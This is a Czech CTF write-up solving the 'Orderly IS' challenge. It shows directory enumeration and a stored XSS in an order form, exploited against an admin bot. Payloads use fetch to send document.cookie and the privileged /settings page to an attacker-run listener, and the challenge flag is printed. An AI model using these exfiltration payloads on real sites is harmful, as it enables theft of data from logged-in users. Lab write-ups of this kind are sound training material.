# Orderly IS (15)

## Zadání

Hi, packet inspector,

do you want to order something? Use our Orderly information system, it is intuitive, fast, reliable and secure! At least that's what we claim in the TV ad. In last few hours it began to act weirdly, but its administrator is on vacation away from civilization (and connectivity).

You will have to break into the [Orderly information system](http://orderly.mysterious-delivery.tcc:23000/) and check its configuration.

May the Packet be with you!

## Nápovědy (Hints)

1\. Use VPN to get access to the server.

## Řešení

Na zobrazené stránce ze zadání jsou v menu položky `Login`, kam se po otevření má napsat heslo, které neznáme a menu `Add`, kam se mohou zadat "data k objednávce".

Zkusíme projet skryté stránky

`dirb http://orderly.mysterious-delivery.tcc:23000`

Byly nalezeny další stránky, které by nás mohly zajímat

```text
==> DIRECTORY: http://orderly.mysterious-delivery.tcc:23000/javascript/
+ http://orderly.mysterious-delivery.tcc:23000/login (CODE:200|SIZE:1846)
+ http://orderly.mysterious-delivery.tcc:23000/logout (CODE:302|SIZE:199)
+ http://orderly.mysterious-delivery.tcc:23000/server-status (CODE:403|SIZE:299)
+ http://orderly.mysterious-delivery.tcc:23000/settings (CODE:302|SIZE:199)
```

Ve výpisu je i stránka `http://orderly.mysterious-delivery.tcc:23000/settings`. Z ní jsme ale okamžitě přesměrováni na stránku `http://orderly.mysterious-delivery.tcc:23000/login`. V ostatních úlohách ale tato stránka obsahovala hledaný flag.

Při zadání `!@#$%^&*()_+{}[]'"` odpoví server je

`Order placed into queue`

Zkusíme něco jiného

```html
<script>
  alert(123)
</script>`
```

Po odeslání se zobrazí v prohlížeči zpráva `123`. Předpokládejme, že na "druhé straně" sedí někdo / něco, co objednávky zpracovává a tomu by se měla tato zpráva zobrazit také. Otestujeme, že jsou objednávky zpracovány tím, že ve skriptu zkusíme načíst stránku z VPN IP našeho serveru.

Spustíme jednoduchý HTTP server, který bude vypisovat přijatá data. Kód je v [server.py](server.py).

`python3 server.py`

a zadáme objednávku

```html
<img src='http://10.200.0.30:8080/test'>
```

Ve výpisu testovacího HTTP serveru se kromě volání z našeho prohlížeče za pár sekund objeví o volání z prohlížeče zpracovávající objednávky.

```text
INFO:root:GET request,
Path: /test
Headers:
Host: 10.200.0.30:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.99.0.131:23000/
Connection: keep-alive



10.99.0.3 - - [16/Oct/2022 20:15:14] "GET /test HTTP/1.1" 200 -
```

Bude se tedy zřejmě jednat o útok pomocí XSS (Cross-site scripting), kdy se v prohlížeči oběti spouští kód útočníka.

---
Zkusíme získat nějaké informace z klienta pomocí skriptu.

```html
<script>
  fetch('http://10.200.0.30:8080/',{method: 'POST', body: "QWEASD"});
</script>
```

Funguje, data nám došla.

```text
INFO:root:POST request,
Path: /
Headers:
Host: 10.200.0.30:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.99.0.131:23000/
Content-Type: text/plain;charset=UTF-8
Origin: http://10.99.0.131:23000
Content-Length: 6
Connection: keep-alive



Body:
QWEASD

10.99.0.2 - - [16/Oct/2022 20:18:06] "POST / HTTP/1.1" 200 -
```

---
Zkusíme získat cookie přihlášeného uživatele

```html
<script>
  fetch('http://10.200.0.30:8080/',{method: 'POST', body: document.cookie});
</script>
```

Tělo odpovědi je ale prázdné

```text

Body:

```

To je proto, že je u session cookie správně nastaven příznak `HttpOnly`, takže není přístupné ze skriptu.

Zkusíme tedy nechat počítač oběti načíst stránku `settings` a pošleme si ji v těle POST požadavku.

```html
<script>
  fetch('/settings')
    .then(response => response.text())
    .then(text => fetch('http://10.200.0.30:8080/',{method: 'POST', body: text}));
</script>
```

Tento postup už funguje, protož počítač zpracovávající objednávky je přihlášený s vyššími oprávněními a má přístup do stránky `settings`.

V odpovědi dostaneme hledaný flag.

```html
<h1>Settings</h1>
<span id="flag">FLAG{9QVE-0miw-qnwm-ER9m}
</span>
```

## Flag

`FLAG{9QVE-0miw-qnwm-ER9m}`
